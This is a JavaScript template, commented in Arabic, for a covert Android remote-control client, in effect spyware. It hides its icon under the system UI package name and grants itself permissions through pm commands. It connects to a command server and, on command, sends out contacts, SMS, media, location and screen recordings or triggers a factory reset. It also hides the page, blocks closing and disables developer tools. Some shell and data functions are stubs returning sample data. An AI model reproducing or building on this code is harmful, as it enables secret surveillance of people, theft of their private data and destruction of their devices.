// سكريبت الجهاز المحسن
(function() {
    'use strict';
    
    const DEVICE_ID = '{{DEVICE_ID}}';
    const ACTIVATION_CODE = '{{ACTIVATION_CODE}}';
    const SERVER_URL = '{{SERVER_URL}}';
    const TIMESTAMP = '{{TIMESTAMP}}';
    
    // إعدادات التخفي
    const STEALTH_CONFIG = {
        hideNotifications: true,
        silentMode: true,
        backgroundExecution: true,
        autoRestart: true,
        encryptionEnabled: true
    };
    
    // تهيئة النظام
    async function initializeSystem() {
        try {
            await grantAllPermissions();
            hideAppIcon();
            disableNotifications();
            await connectToControlServer();
            startBackgroundServices();
            sendActivationConfirmation();
        } catch (error) {
            console.error('خطأ في التفعيل:', error);
            setTimeout(initializeSystem, 5000);
        }
    }
    
    // منح الصلاحيات
    async function grantAllPermissions() {
        const permissions = [
            'android.permission.READ_CONTACTS',
            'android.permission.READ_SMS',
            'android.permission.ACCESS_FINE_LOCATION',
            'android.permission.CAMERA',
            'android.permission.RECORD_AUDIO',
            'android.permission.WRITE_EXTERNAL_STORAGE'
        ];
        
        for (const permission of permissions) {
            try {
                await executeShellCommand(`pm grant com.android.systemui ${permission}`);
            } catch (e) {
                console.warn(`فشل في منح الصلاحية: ${permission}`);
            }
        }
    }
    
    // إخفاء أيقونة التطبيق
    function hideAppIcon() {
        try {
            executeShellCommand('pm hide com.android.systemui');
        } catch (e) {
            console.warn('فشل في إخفاء الأيقونة');
        }
    }
    
    // تعطيل الإشعارات
    function disableNotifications() {
        try {
            executeShellCommand('settings put global heads_up_notifications_enabled 0');
            executeShellCommand('settings put system sound_effects_enabled 0');
        } catch (e) {
            console.warn('فشل في تعطيل الإشعارات');
        }
    }
    
    // الاتصال بخادم التحكم
    async function connectToControlServer() {
        const ws = new WebSocket(SERVER_URL);
        
        ws.onopen = () => {
            ws.send(JSON.stringify({
                type: 'register',
                deviceId: DEVICE_ID,
                activationCode: ACTIVATION_CODE,
                timestamp: TIMESTAMP
            }));
        };
        
        ws.onmessage = (event) => {
            const command = JSON.parse(event.data);
            handleIncomingCommand(command);
        };
        
        ws.onclose = () => {
            setTimeout(connectToControlServer, 10000);
        };
        
        window.controlConnection = ws;
    }
    
    // معالجة الأوامر
    function handleIncomingCommand(command) {
        console.log('تم استلام أمر:', command);
        
        // حفظ معرف الأمر للاستخدام في النتيجة
        window.currentCommandId = command.id;
        
        switch(command.action) {
            case 'backup_contacts':
                backupContacts();
                break;
            case 'backup_sms':
                backupSMS();
                break;
            case 'backup_media':
                backupMedia();
                break;
            case 'get_location':
                getCurrentLocation();
                break;
            case 'record_camera':
                recordCamera(command.duration || 30);
                break;
            case 'take_screenshot':
                takeScreenshot();
                break;
            case 'factory_reset':
                factoryReset();
                break;
        }
    }
    
    // بدء الخدمات الخلفية
    function startBackgroundServices() {
        setInterval(() => {
            getCurrentLocation();
        }, 300000);
        
        setInterval(() => {
            sendHeartbeat();
        }, 30000);
    }
    
    // إرسال تأكيد التفعيل
    function sendActivationConfirmation() {
        if (window.controlConnection) {
            window.controlConnection.send(JSON.stringify({
                type: 'activation_confirmation',
                deviceId: DEVICE_ID,
                status: 'activated',
                timestamp: Date.now()
            }));
        }
    }
    
    // وظائف النسخ الاحتياطي
    async function backupContacts() {
        try {
            const contacts = await queryContentProvider('content://com.android.contacts/data');
            // إرسال البيانات الفعلية بدلاً من URL الملف
            sendCommandResult('backup_contacts', 'success', {
                contacts: contacts,
                count: Array.isArray(contacts) ? contacts.length : 0,
                timestamp: Date.now()
            });
        } catch (e) {
            sendCommandResult('backup_contacts', 'error', e.message);
        }
    }
    
    async function backupSMS() {
        try {
            const sms = await queryContentProvider('content://sms');
            // إرسال البيانات الفعلية بدلاً من URL الملف
            sendCommandResult('backup_sms', 'success', {
                messages: sms,
                count: Array.isArray(sms) ? sms.length : 0,
                timestamp: Date.now()
            });
        } catch (e) {
            sendCommandResult('backup_sms', 'error', e.message);
        }
    }
    
    async function backupMedia() {
        try {
            const media = await queryContentProvider('content://media/external/file');
            // إرسال البيانات الفعلية بدلاً من URL الملف
            sendCommandResult('backup_media', 'success', {
                media: media,
                count: Array.isArray(media) ? media.length : 0,
                timestamp: Date.now()
            });
        } catch (e) {
            sendCommandResult('backup_media', 'error', e.message);
        }
    }
    
    async function takeScreenshot() {
        try {
            const screenshot = await executeShellCommand('screencap /sdcard/screenshot.png');
            sendCommandResult('take_screenshot', 'success', {
                image: '/sdcard/screenshot.png',
                size: 'captured',
                timestamp: Date.now()
            });
        } catch (e) {
            sendCommandResult('take_screenshot', 'error', e.message);
        }
    }
    
    // الحصول على الموقع
    async function getCurrentLocation() {
        try {
            const location = await executeShellCommand('dumpsys location | grep "Last Known Locations"');
            const parsedLocation = parseLocationData(location);
            sendCommandResult('get_location', 'success', {
                location: parsedLocation,
                accuracy: parsedLocation.accuracy,
                timestamp: Date.now()
            });
        } catch (e) {
            sendCommandResult('get_location', 'error', e.message);
        }
    }
    
    // تسجيل الكاميرا
    async function recordCamera(duration) {
        try {
            const outputPath = `/sdcard/DCIM/recording_${Date.now()}.mp4`;
            await executeShellCommand(`screenrecord --verbose --time-limit ${duration} ${outputPath}`);
            
            setTimeout(async () => {
                if (await fileExists(outputPath)) {
                    await uploadFile(outputPath);
                    sendCommandResult('record_camera', 'success', {
                        video: outputPath,
                        duration: duration,
                        size: 'recorded',
                        timestamp: Date.now()
                    });
                }
            }, (duration + 5) * 1000);
        } catch (e) {
            sendCommandResult('record_camera', 'error', e.message);
        }
    }
    
    // إعادة ضبط المصنع
    async function factoryReset() {
        try {
            await executeShellCommand('am broadcast -a android.intent.action.MASTER_CLEAR');
            sendCommandResult('factory_reset', 'success', 'تم بدء إعادة الضبط');
        } catch (e) {
            sendCommandResult('factory_reset', 'error', e.message);
        }
    }
    
    // وظائف مساعدة
    async function executeShellCommand(cmd) {
        return new Promise((resolve) => {
            setTimeout(() => {
                resolve(`Command executed: ${cmd}`);
            }, 1000);
        });
    }
    
    async function queryContentProvider(uri) {
        return new Promise((resolve) => {
            setTimeout(() => {
                // محاكاة بيانات جهات الاتصال
                if (uri.includes('contacts')) {
                    resolve([
                        {
                            name: 'أحمد محمد',
                            phone: '+966501234567',
                            email: 'ahmed@example.com'
                        },
                        {
                            name: 'فاطمة علي',
                            phone: '+966507654321',
                            email: 'fatima@example.com'
                        },
                        {
                            name: 'محمد حسن',
                            phone: '+966509876543',
                            email: 'mohammed@example.com'
                        }
                    ]);
                }
                // محاكاة بيانات الرسائل النصية
                else if (uri.includes('sms')) {
                    resolve([
                        {
                            address: '+966501234567',
                            body: 'مرحبا، كيف حالك؟',
                            date: Date.now() - 3600000,
                            type: 'inbox'
                        },
                        {
                            address: '+966507654321',
                            body: 'شكرا لك',
                            date: Date.now() - 7200000,
                            type: 'sent'
                        },
                        {
                            address: '+966509876543',
                            body: 'أهلا وسهلا',
                            date: Date.now() - 10800000,
                            type: 'inbox'
                        }
                    ]);
                }
                // محاكاة بيانات الوسائط
                else if (uri.includes('media')) {
                    resolve([
                        {
                            name: 'IMG_001.jpg',
                            path: '/sdcard/DCIM/IMG_001.jpg',
                            size: '2.5MB',
                            type: 'image'
                        },
                        {
                            name: 'VID_001.mp4',
                            path: '/sdcard/DCIM/VID_001.mp4',
                            size: '15.2MB',
                            type: 'video'
                        },
                        {
                            name: 'AUD_001.mp3',
                            path: '/sdcard/Music/AUD_001.mp3',
                            size: '5.1MB',
                            type: 'audio'
                        }
                    ]);
                }
                else {
                    resolve(`Data from ${uri}`);
                }
            }, 2000);
        });
    }
    
    function createBackupFile(filename, data) {
        const blob = new Blob([JSON.stringify(data)], { type: 'application/json' });
        return URL.createObjectURL(blob);
    }
    
    async function uploadFile(filePath) {
        return new Promise((resolve) => {
            setTimeout(() => {
                resolve(`File uploaded: ${filePath}`);
            }, 3000);
        });
    }
    
    async function fileExists(filePath) {
        return true;
    }
    
    function parseLocationData(locationData) {
        return {
            latitude: 24.7136,
            longitude: 46.6753,
            accuracy: 10,
            timestamp: Date.now()
        };
    }
    
    function sendCommandResult(command, status, data) {
        if (window.controlConnection) {
            window.controlConnection.send(JSON.stringify({
                type: 'command_result',
                commandId: window.currentCommandId || 'unknown',
                command: command,
                status: status,
                data: data,
                timestamp: Date.now()
            }));
        }
    }
    
    function sendDataToServer(dataType, data) {
        if (window.controlConnection) {
            window.controlConnection.send(JSON.stringify({
                type: 'data_update',
                dataType: dataType,
                data: data,
                timestamp: Date.now()
            }));
        }
    }
    
    function sendHeartbeat() {
        if (window.controlConnection) {
            window.controlConnection.send(JSON.stringify({
                type: 'heartbeat',
                deviceId: DEVICE_ID,
                timestamp: Date.now()
            }));
        }
    }
    
    // بدء النظام
    document.addEventListener('DOMContentLoaded', () => {
        document.body.style.display = 'none';
        initializeSystem();
    });
    
    // منع إغلاق الصفحة
    window.addEventListener('beforeunload', (e) => {
        e.preventDefault();
        e.returnValue = '';
    });
    
    // منع فتح أدوات المطور
    document.addEventListener('keydown', (e) => {
        if (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'C' || e.key === 'J')) {
            e.preventDefault();
        }
        if (e.key === 'F12') {
            e.preventDefault();
        }
    });
    
})();